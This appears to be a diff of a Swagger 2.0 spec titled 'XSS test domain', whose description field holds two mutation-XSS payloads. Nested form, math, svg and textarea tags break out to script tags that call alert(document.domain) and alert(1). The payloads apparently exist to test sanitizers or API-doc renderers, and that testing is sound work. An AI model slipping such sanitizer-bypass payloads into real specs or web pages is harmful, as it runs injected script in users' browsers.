@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
   title: XSS test domain
-  description: |
+  description: 
     #<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script> alert(document.domain)</script>"></form>
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script> alert(1)</script>"></form>
